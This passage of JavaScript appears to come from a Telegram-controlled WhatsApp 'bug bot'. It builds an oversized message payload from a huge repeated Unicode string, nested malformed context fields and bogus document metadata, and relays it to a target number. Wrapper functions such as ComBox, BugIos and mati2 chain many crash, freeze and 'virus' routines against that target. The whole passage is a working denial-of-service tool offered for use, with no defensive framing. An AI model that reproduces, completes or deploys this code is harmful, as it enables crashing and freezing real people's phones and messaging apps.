⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(5000000000),
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                            mentionedJid: Array.from({ length: 9 }, () => "1@newsletter"),
                            contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "9@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                            groupMentions: [
                                {
                                    groupJid: "1@newsletter", 
                                    groupSubject: "UNDEFINED",  
                                    groupMetadata: {
                                        creationTimestamp: 1715880173,  
                                        ownerJid: "owner@newsletter",  
                                        adminJids: ["admin@newsletter", "developer@newsletter"], 
                                    }
                                }
                            ],
                            externalContextInfo: {
                                customTag: "SECURE_PAYBUG_MESSAGE",  
                                securityLevel: "HIGH",  
                                referenceCode: "PAYBUG10291",  
                                timestamp: new Date().toISOString(),  
                                messageId: "MSG00123456789",  
                                userId: "UNDEFINED"  
                            },
                            mentionedJid: Array.from({ length: 9 }, () => "9@newsletter"),
                            groupMentions: [{ groupJid: "9@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 8 }, () => "8@newsletter"),
                            groupMentions: [{ groupJid: "8@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 7 }, () => "7@newsletter"),
                            groupMentions: [{ groupJid: "7@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 6 }, () => "6@newsletter"),
                            groupMentions: [{ groupJid: "6@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 4 }, () => "4@newsletter"),
                            groupMentions: [{ groupJid: "4@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 3 }, () => "3@newsletter"),
                            groupMentions: [{ groupJid: "3@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2 }, () => "2@newsletter"),
                            groupMentions: [{ groupJid: "2@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 1 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };
    sock.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}    				
        async function ComBox(target) {
      for (let i = 0; i < 1; i++) {
      await CrashOld(target);
        await BlankScreen(target)
        await BugMain(target)
        await InvisibleLoadFast(target);
        await CrashOld(target);
        await InvisibleLoadFast(target);
        await CrashOld(target);
        await BugMain(target)
        await BugMain(target);
        await BugMain(target);
        await InvisibleLoadFast(target);
        await CrashOld(target);
        await InvisibleLoadFast(target);
        await CrashOld(target);
        await BugMain(target)
        await BugMain(target);
        await Freezebug(target, Ptcp = true);
        await documentfreeze2(target, Ptcp = true);
        await FrezeeMsg1(target);
        await FrezeeMsg2(target);
        await VRL(target, Ptcp = true);
        await Starui(target, Ptcp = true);
      }
      console.log(chalk.red.bold(`SEND BUGS VRL TO ${target}`))
      }
async function ForCe(target) {
      for (let i = 0; i < 1; i++) {
        await BugMain(target)
        await InvisibleLoadFast(target);
        await CrashOld(target);
        await InvisibleLoadFast(target);
        await CrashOld(target);
        await BugMain(target)
        await BugMain(target);
      }
      console.log(chalk.red.bold(`SEND BUGS FORCE TO ${target}`))
      }
async function BugIos(target) {
    {
        await IosMJ(target, true);
        await XiosVirus(target);
        await QDIphone(target);
        await QPayIos(target);
        await QPayStriep(target);
        await FBiphone(target);
        await VenCrash(target);
        await AppXCrash(target);
        await SmCrash(target);
        await SqCrash(target);
        await IosMJ(target, true);
        await XiosVirus(target);
      }
      console.log(
        chalk.red.bold(
          `SEND BUGS VRL TO ${target}!`
        )
      );
    }
async function mati3(target) {
      for (let i = 0; i < 1; i++) {
 await BugMain(target)
        await InvisibleLoadFast(target);
        await CrashOld(target);
        await InvisibleLoadFast(target);
        await CrashOld(target);
        await BugMain(target)
        await BugMain(target);
      }
      console.log(chalk.red.bold(`SEND BUGS FORCE TO ${target}`))
      }
async function mati1(target) {
      for (let i = 0; i < 1; i++) {
  await BugMain(target)
        await InvisibleLoadFast(target);
        await CrashOld(target);
        await InvisibleLoadFast(target);
        await CrashOld(target);
        await BugMain(target)
        await BugMain(target);
      }
      console.log(chalk.red.bold(`SEND BUGS FORCE TO ${target}`))
      }
async function mati2(target) {
      for (let i = 0; i < 1; i++) {
      VrlXRobust(target, sock, (cct = true), (ptcp = true));
      await BugMain(target, ptcp = true)
        await Fuckui(target);
        await freezefile(target, ptcp = true)      
        await InvisibleLoadFast(target);       
        await InvisibleLoadFast(target);  
        await BugMain(target, ptcp = true)
        await Fuckui(target);
        await Fuckui(target);
        await BugMain(target, ptcp = true)    
        await freezefile(target, ptcp = true)            
        await InvisibleLoadFast(target);  
        await BugMain(target, ptcp = true)      
         await Fuckui(target);
         await Fuckui(target);
        await freezefile(target, ptcp = true)                      
        await BugMain(target, ptcp = true)
        await BugMain(target, ptcp = true)
      }
      console.log(chalk.red.bold(`SEND BUGS FORCE TO ${target}`))
      }
bot.launch();
console.log("Telegram bot is running...");